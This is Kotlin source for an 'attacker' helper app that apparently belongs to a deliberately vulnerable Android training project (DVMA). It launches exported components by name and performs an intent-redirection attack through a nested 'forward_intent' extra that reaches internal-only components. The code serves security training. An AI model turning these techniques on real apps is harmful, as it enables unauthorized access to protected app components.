package com.dvma.attacker

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Starts/invokes DVMA's exported components from this separate, unprivileged
 * app. FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
 *
 * The exported-component modules (starting with exported_android_components)
 * rely on DVMA exporting an Activity/Service with no caller check. This helper
 * lets the attacker reach them by explicit component name - a cross-process
 * start driven by the harness via `am start`/extras.
 */
object ComponentInvoker {

    private const val TAG = "DVMA-ATTACKER"

    /** Start an exported DVMA Activity by fully-qualified component name. */
    fun startActivity(ctx: Context, component: String, extras: Map<String, String> = emptyMap()) {
        val intent = Intent().apply {
            setClassName(Dvma.PKG, component)
            for ((k, v) in extras) putExtra(k, v)
        }
        launch(ctx, intent, component)
    }

    /**
     * intent_redirection: start DVMA's exported proxy with a nested "forward"
     * Intent (Parcelable extra) that targets an internal-only component. The
     * proxy forwards it with no validation.
     */
    fun startWithForward(ctx: Context, proxy: String, forwardComponent: String) {
        val forward = Intent().apply { setClassName(Dvma.PKG, forwardComponent) }
        val intent = Intent().apply {
            setClassName(Dvma.PKG, proxy)
            putExtra("forward_intent", forward)
        }
        launch(ctx, intent, proxy)
    }

    private fun launch(ctx: Context, intent: Intent, component: String) {
        runCatching {
            if (ctx is Activity) {
                ctx.startActivityForResult(intent, REQUEST_CODE)
            } else {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
            }
        }
            .onSuccess { Log.w(TAG, "started exported component $component") }
            .onFailure { Log.w(TAG, "failed to start $component: ${it.message}") }
    }

    private const val REQUEST_CODE = 4201
}
